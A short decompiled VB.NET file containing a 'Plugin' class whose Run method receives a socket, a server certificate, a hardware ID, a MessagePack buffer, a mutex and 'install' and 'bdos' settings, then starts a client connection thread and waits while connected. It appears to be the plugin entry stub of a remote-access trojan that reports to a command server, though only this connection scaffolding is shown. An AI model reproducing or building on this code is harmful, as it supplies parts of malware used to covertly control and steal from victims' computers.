Imports System
Imports System.Diagnostics
Imports System.Net.Sockets
Imports System.Security.Cryptography.X509Certificates
Imports System.Threading

Namespace Plugin
	' Token: 0x02000004 RID: 4
	Public Class Plugin
		' Token: 0x06000014 RID: 20 RVA: 0x00002570 File Offset: 0x00000770
		Public Sub Run(socket As Socket, certificate As X509Certificate2, hwid As String, msgPack As Byte(), mutex As Mutex, mtx As String, bdos As String, install As String)
			Debug.WriteLine("Plugin Invoked")
			Plugin.AppMutex = mutex
			Plugin.Mutex = mtx
			Plugin.BDOS = bdos
			Plugin.Install = install
			Plugin.Socket = socket
			Connection.ServerCertificate = certificate
			Connection.Hwid = hwid
			New Thread(Sub()
				Connection.InitializeClient(msgPack)
			End Sub).Start()
			While Connection.IsConnected
				Thread.Sleep(1000)
			End While
		End Sub

		' Token: 0x04000007 RID: 7
		Public Shared Socket As Socket

		' Token: 0x04000008 RID: 8
		Public Shared AppMutex As Mutex

		' Token: 0x04000009 RID: 9
		Public Shared Mutex As String

		' Token: 0x0400000A RID: 10
		Public Shared BDOS As String

		' Token: 0x0400000B RID: 11
		Public Shared Install As String

		' Token: 0x0400000C RID: 12
		Public Shared InstallFile As String
	End Class
End Namespace
